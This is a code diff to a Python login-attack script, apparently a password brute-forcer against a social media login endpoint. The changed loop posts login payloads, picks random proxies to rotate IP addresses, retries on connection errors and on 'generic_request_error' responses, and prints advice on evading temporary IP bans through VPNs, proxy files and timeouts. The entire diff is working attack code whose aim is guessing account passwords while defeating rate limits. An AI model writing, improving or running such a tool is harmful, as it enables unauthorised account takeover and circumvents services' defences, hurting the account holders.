@@ -423,47 +423,57 @@ def main():
         }
 
         while True:
-            # Checking if proxy is enabled (if, then use proxy)
+            while True:
+                # Checking if proxy is enabled (if, then use proxy)
+                if proxy:
+                    # get random proxy from proxy list
+                    random_proxy = random.choice(list(proxies))
+                    single_proxy = {
+                        'http': random_proxy,
+                        'https': random_proxy
+                    }
+                else:
+                    single_proxy = None
+
+                # Sending the request
+                try:
+                    login_response = requests.post(login_url, data=payload, headers=login_header, proxies=single_proxy)
+                    break
+                except requests.exceptions.ConnectionError:
+                    continue
+
+            # proxy check if working
             if proxy:
-                # get random proxy from proxy list
-                random_proxy = random.choice(list(proxies))
-                single_proxy = {
-                    'http': random_proxy,
-                    'https': random_proxy
+                headers = {
+                    "User-Agent": user_agent
                 }
-            else:
-                single_proxy = None
 
-            # Sending the request
+            # Checking if the request returned 403 (temporary ip block/username not found)
+            if login_response.status_code == 403 or login_response.status_code == "403":
+                printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes", coledt=[4, 49, 91])
+                if verbose:
+                    printit("["+str(login_response.status_code)+"]: You can also use proxy/VPN (change active vpn server)", coledt=[4, 49, 91])
+                    printit("["+str(login_response.status_code)+"]: To avoid this use built-in IP rotating proxy (-p/--proxy)", coledt=[4, 49, 91])
+                    printit("["+str(login_response.status_code)+"]: OR use custom proxy file for IP rotating (-f/--proxy-file)", coledt=[4, 49, 91])
+                    printit("["+str(login_response.status_code)+"]: Timeout between each request can also help (-t/--timeout)\n", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: Also check if the USERNAME entered is available", coledt=[4, 49, 91], line_down=True)
+                sys.exit()
+
+            # login_response -> json format
             try:
-                login_response = requests.post(login_url, data=payload, headers=login_header, proxies=single_proxy)
+                json_data = json.loads(login_response.text)
+            except json.decoder.JSONDecodeError:
+                pass
+
+
+            # Checking if json has 'error_type' == 'generic_request_error', retry request with different proxy
+            try:
+                if json_data["error_type"] == "generic_request_error":
+                    continue
+            except:
                 break
-            except requests.exceptions.ConnectionError:
-                continue
 
-        # proxy check if working
-        if proxy:
-            headers = {
-                "User-Agent": user_agent
-            }
 
-        # Checking if the request returned 403 (temporary ip block/username not found)
-        if login_response.status_code == 403 or login_response.status_code == "403":
-            printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes", coledt=[4, 49, 91])
-            if verbose:
-                printit("["+str(login_response.status_code)+"]: You can also use proxy/VPN (change active vpn server)", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: To avoid this use built-in IP rotating proxy (-p/--proxy)", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: OR use custom proxy file for IP rotating (-f/--proxy-file)", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: Timeout between each request can also help (-t/--timeout)\n", coledt=[4, 49, 91])
-            printit("["+str(login_response.status_code)+"]: Also check if the USERNAME entered is available", coledt=[4, 49, 91], line_down=True)
-            sys.exit()
-
-        # login_response -> json format
-        try:
-            json_data = json.loads(login_response.text)
-        except json.decoder.JSONDecodeError:
-            pass
-        
         # Checking if the username is exists
         try:
             if json_data["user"] == False:
